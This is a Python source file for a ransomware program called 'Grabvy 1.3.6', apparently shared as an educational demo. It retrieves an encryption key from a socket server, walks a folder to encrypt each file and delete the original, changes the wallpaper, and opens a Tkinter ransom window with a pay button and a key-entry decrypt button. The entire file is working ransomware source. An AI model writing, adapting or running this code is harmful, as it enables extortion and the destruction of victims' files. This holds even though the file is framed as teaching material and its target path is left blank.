# Modules
from time import sleep
from cryptography.fernet import Fernet
import os, socket, webbrowser
import tkinter as tk
import tkinter.font as tkFont
from tkinter import *
from PyWallpaper import change_wallpaper


# Function encrypt
def encrypt(path):
    with open(path, "rb") as normal_file:
        with open(path + ".encrypted", "wb") as encrypted_file:
            encrypted_content = fn.encrypt(normal_file.read())
            encrypted_file.write(encrypted_content)
            encrypted_file.close()
        normal_file.close()
    os.remove(path)


# Function decrypt
def decrypt(path):
    with open(path, "rb") as encrypted_file:
        with open(path[:-10], "wb") as normal_file:
            decrypted_content = fn.decrypt(encrypted_file.read())
            normal_file.write(decrypted_content)
            normal_file.close()
        encrypted_file.close()
    os.remove(path)


# Connect to the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4321))
s.send(b'key')
key = s.recv(255)
text_key = str(key).split("'")
s.close()


# Run the encryption function
fn = Fernet(key)

# Put the path of the folder you want to encrypt
# Replace the characters \ by \\
# Ex C:\Users\username\Desktop\Ransomware\v2\Ransomware\files = C:\\Users\\username\\Desktop\\Ransomware\\v2\\Ransomware\\files
for path, dirs, files in os.walk(""):
    for f in files:
        encrypt(os.path.join(path, f))

"""
# Exemple for encryption function
fn = Fernet(key)
for path, dirs, files in os.walk("C:\\Users\\uagko\\Desktop\\Ransomware\\v2\\Ransomware\\files"):
    for f in files:
        encrypt(os.path.join(path, f))
"""


# Tkinter
change_wallpaper("")

def function_pay():
    newwindow2()

def newwindow():
    valid_key = Toplevel(root)
    valid_key.iconbitmap("logo.ico")
    valid_key.title("Valid key !")
    width = 800
    height = 500
    screenwidth = valid_key.winfo_screenwidth()
    screenheight = valid_key.winfo_screenheight()
    alignstr = '%dx%d+%d+%d' % (width, height,
                            (screenwidth - width) / 2, (screenheight - height) / 2)
    valid_key.geometry(alignstr)
    valid_key.resizable(width=False, height=False)

    title = tk.Label(valid_key)
    title["anchor"] = "center"
    ft = tkFont.Font(family='Times', size=23)
    title["font"] = ft
    title["bg"] = "#d02323"
    title["fg"] = "#ffffff"
    title["justify"] = "center"
    title["text"] = "Great, all your data has been decrypted!"
    title.place(x=150, y=20)

    # Subtitle
    subtile_text = '''
_______________________________________________ 

Grabvy 1.3.6  (Working hours : +28h)
Coded by Ro**on **tt**eu
grabmytx@protonmail.com
_______________________________________________


Le code source est mis à disposition pour ceux 
qui veulent uniquement dans un but éducatif :
https://github.com/Grabmytx/Grabmytx-1.3.6
    
Pour plus d’informations contacté moi à
l’adresse mail suivante : grabmytx@protonmail.com

'''
    subtitle = tk.Label(valid_key)
    ft = tkFont.Font(family='Times', size=13)
    subtitle["bg"] = "#d02323"
    subtitle["font"] = ft
    subtitle["fg"] = "white"
    subtitle["justify"] = "center"
    subtitle["text"] = subtile_text
    subtitle.place(x=0, y=120, width=800)

    valid_key.config(background='#d02323')
    valid_key.mainloop()

def newwindow2():

    key = Toplevel(root)
    key.iconbitmap("logo.ico")
    key.title("Encryption key")
    width = 800
    height = 200
    screenwidth = key.winfo_screenwidth()
    screenheight = key.winfo_screenheight()
    alignstr = '%dx%d+%d+%d' % (width, height,
                            (screenwidth - width) / 2, (screenheight - height) / 2)
    key.geometry(alignstr)
    key.resizable(width=False, height=False)

    title = tk.Label(key)
    title["anchor"] = "center"
    ft = tkFont.Font(family='Times', size=23)
    title["font"] = ft
    title["bg"] = "#d02323"
    title["fg"] = "#ffffff"
    title["justify"] = "center"
    title["text"] = "Payments made, here is the encryption key : "
    title.place(x=150, y=20)
    subtitle = tk.Label(key)
    ft = tkFont.Font(family='Times', size=13)
    subtitle["bg"] = "#d02323"
    subtitle["font"] = ft
    subtitle["fg"] = "white"
    subtitle["justify"] = "center"
    subtitle["text"] = text_key[1]
    subtitle.place(x=200, y=100)
    key.config(background='#d02323')


def function_decrypt():
    text_entry = entry_decrypt.get()

    if text_key[1] == text_entry:
        try:
            for path, dirs, files in os.walk("C:\\Users\\ghost\\Desktop\\Ransomware\\v2\\Ransomware\\files"):
                for f in files:
                    decrypt(os.path.join(path, f))
        except Exception as e:
                entry_decrypt.delete(0, END)
                entry_decrypt.insert(0, "Error : ", e)

        entry_decrypt.delete(0, END)
        entry_decrypt.insert(0, "Valid key !")
        newwindow()
        root.destroy()
    else:
        entry_decrypt.delete(0, END)
        entry_decrypt.insert(0, "No valid key !")
    return None

root = Tk()

# Setting title
root.title("Grabvy 1.3.6")

# Setting window size
width = 800
height = 500
screenwidth = root.winfo_screenwidth()
screenheight = root.winfo_screenheight()
alignstr = '%dx%d+%d+%d' % (width, height,
                            (screenwidth - width) / 2, (screenheight - height) / 2)
root.geometry(alignstr)
root.resizable(width=False, height=False)

# Tile
title = tk.Label(root)
title["anchor"] = "center"
title["bg"] = "#d02323"
ft = tkFont.Font(family='Times', size=23)
title["font"] = ft
title["fg"] = "#ffffff"
title["justify"] = "center"
title["text"] = "Ooops, your files have been encrypted!"
title.place(x=150, y=20, width=500, height=54)

# Subtitle
subtile_text = '''
You are a victim of ransomware.
All your personal data has been encrypted.
You can no longer read what was in it.
To recover your files, follow the instructions by clicking on the button below.
Thank you for your credulity ;)
'''
subtitle = tk.Label(root)
ft = tkFont.Font(family='Times', size=13)
subtitle["bg"] = "#d02323"
subtitle["font"] = ft
subtitle["fg"] = "white"
subtitle["justify"] = "center"
subtitle["text"] = subtile_text
subtitle.place(x=100, y=160)

# Button for pay
button_pay = tk.Button(root)
button_pay["bg"] = "#ffffff"
ft = tkFont.Font(family='Times', size=10)
button_pay["font"] = ft
button_pay["fg"] = "#000000"
button_pay["justify"] = "center"
button_pay["text"] = "Pay"
button_pay.place(x=20, y=440, width=100, height=30)
button_pay["command"] = function_pay

# Button for decrypt
button_decrypt = tk.Button(root)
button_decrypt["bg"] = "#ffffff"
ft = tkFont.Font(family='Times', size=10)
button_decrypt["font"] = ft
button_decrypt["fg"] = "#000000"
button_decrypt["justify"] = "center"
button_decrypt["text"] = "Decrypt"
button_decrypt.place(x=260, y=440, width=100, height=30)
button_decrypt["command"] = function_decrypt

# Entry for decrypt key
entry_decrypt = tk.Entry(root)
entry_decrypt["bg"] = "#ffffff"
entry_decrypt["borderwidth"] = "1px"
ft = tkFont.Font(family='Times', size=10)
entry_decrypt["font"] = ft
entry_decrypt["fg"] = "black"
entry_decrypt["justify"] = "center"
entry_decrypt["text"] = "exemple : wqwXXXqGohCffijbWlojd9nPYNvJ_OgbniUazE3T3KY="
entry_decrypt.place(x=370, y=440, width=400, height=30)

root.config(background='#d02323')
root.iconbitmap("logo.ico")
root.mainloop()